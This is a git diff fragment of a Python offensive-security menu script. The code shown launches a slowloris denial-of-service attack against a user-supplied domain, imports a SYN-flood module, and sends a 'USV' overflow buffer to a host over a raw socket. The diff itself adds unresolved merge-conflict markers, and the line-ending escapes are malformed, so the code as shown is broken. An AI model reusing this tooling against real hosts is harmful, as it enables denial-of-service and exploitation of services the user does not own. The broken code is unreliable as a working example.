@@ -140,7 +140,11 @@ You have selected the Vulnerability Analysis module
                 myCmd = "slowloris -v " + domain
                 os.system(myCmd)
             if doschoice == "2":
+<<<<<<< Updated upstream
                 from modules import syn_flood    
+=======
+                from modules import syn_flood
+>>>>>>> Stashed changes
         if exChoice == "3":
             clear = lambda: os.system('cls')
             clear() 
@@ -153,8 +157,12 @@ You have selected the Vulnerability Analysis module
             s.connect((host,port))
             s.send("USV " + buffer + "//r//n//r")
             s.close()
+<<<<<<< Updated upstream
             print("[+] Packets sent")     
                          
+=======
+            print("[+] Packets sent")                
+>>>>>>> Stashed changes
     if choice == "4":
         print(logo)
         print("Lets crack some hashes")
